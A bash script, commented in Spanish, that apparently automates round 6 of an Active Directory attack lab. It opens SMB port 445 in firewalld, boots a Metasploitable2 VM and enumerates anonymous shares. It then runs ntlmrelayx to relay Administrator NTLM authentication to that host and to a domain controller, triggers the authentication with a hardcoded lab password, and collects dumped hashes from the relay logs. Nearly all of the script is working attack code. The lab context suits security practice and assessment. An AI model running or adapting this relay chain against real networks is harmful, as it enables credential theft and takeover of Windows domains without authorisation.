#!/usr/bin/env bash
# =============================================================================
# SUITE AD REAL — ROUND 6 (relay win, zona firewalld correcta)
# =============================================================================
set -u
DC=192.168.122.50
ADMIN='Administrator'
ADMPW='TarsLab2026!'
VENV=/opt/ad-tools-venv/bin
OUT=/opt/ad-lab/evidence/suite-ad-real-20260809
HOST_IP=192.168.122.1
TS(){ date +%H:%M:%S; }
echo "[$(TS)] ============ ROUND 6 START ============"

echo "[$(TS)] === R6.1 zonas firewalld activas ==="
firewall-cmd --get-active-zones 2>&1 | tee "$OUT/08b-firewall.txt"
ZONE_OK=""
for z in libvirt FedoraWorkstation public trusted; do
  echo "[$(TS)] probando zona=$z"
  firewall-cmd --zone=$z --add-port=445/tcp >/dev/null 2>&1
  sleep 1
  if nc -zvw2 $HOST_IP 445 >/dev/null 2>&1; then
    echo "ZONA_OK=$z" | tee -a "$OUT/08b-firewall.txt"
    ZONE_OK=$z
    break
  fi
done
nc -zvw2 $HOST_IP 445 2>&1 | tee -a "$OUT/08b-firewall.txt"

# --- boot metasploitable2 (si no esta up) ---
virsh list --all | grep -q "metasploitable2.*running" || virsh start metasploitable2 2>&1 | head -2
META_IP=""
for i in $(seq 1 18); do
  sleep 10
  META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk '{print $5}' | grep -oE '192\.168\.122\.[0-9]+' | grep -vE '^192\.168\.122\.(50|151)$' | head -1)
  [ -n "$META_IP" ] && break
done
echo "[$(TS)] metasploitable2 IP=${META_IP:-NONE}"
echo "${META_IP:-NONE}" > "$OUT/08a-meta-ip.txt"

if [ -n "$META_IP" ] && [ -n "$ZONE_OK" ]; then
  echo "[$(TS)] === R6.2 target checks (single host) ==="
  timeout 15 $VENV/nxc smb "$META_IP" -u '' -p '' --shares 2>&1 | tee "$OUT/08a-meta-anon-shares.txt"
  echo "[$(TS)] === R6.3 RELAY WIN: Administrator -> metasploitable2 ==="
  $VENV/ntlmrelayx.py -t "smb://$META_IP" -smb2support -l "$OUT/relay-loot-meta" >"$OUT/08-relayx-meta.log" 2>&1 &
  RELAYPID=$!
  sleep 7
  timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08c-trigger-smbclient.txt"
  sleep 15
  kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
  grep -iE "authenticated|dumping|sam|share|nt_status|session|attempting|error|wrote|smb-|target|hash" "$OUT/08-relayx-meta.log" | head -40 | tee "$OUT/08d-relay-meta-result.txt"
  ls -la "$OUT/relay-loot-meta/" 2>/dev/null | head -8 | tee -a "$OUT/08d-relay-meta-result.txt"

  echo "[$(TS)] === R6.4 relay Administrator -> DC SMB (signing) ==="
  $VENV/ntlmrelayx.py -t "smb://$DC" -smb2support -l "$OUT/relay-loot-dcsmb" >"$OUT/08-relayx-dcsmb.log" 2>&1 &
  RELAYPID=$!
  sleep 7
  timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08h-trigger-dcsmb.txt"
  sleep 15
  kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
  grep -iE "authenticated|dumping|sam|nt_status|session|attempting|error|signing|refus|accept|target|smb-|hash" "$OUT/08-relayx-dcsmb.log" | head -25 | tee "$OUT/08i-relay-dcsmb-result.txt"
else
  echo "[$(TS)] SKIP relay: META_IP=${META_IP:-none} ZONE_OK=${ZONE_OK:-none}" | tee "$OUT/08d-relay-meta-result.txt"
fi

echo "[$(TS)] === R6.5 cleanup ==="
[ -n "${ZONE_OK:-}" ] && firewall-cmd --zone=$ZONE_OK --remove-port=445/tcp 2>&1 | head -1
firewall-cmd --remove-port=445/tcp >/dev/null 2>&1
virsh shutdown metasploitable2 2>&1 | head -1
echo "[$(TS)] ============ ROUND 6 DONE ============"
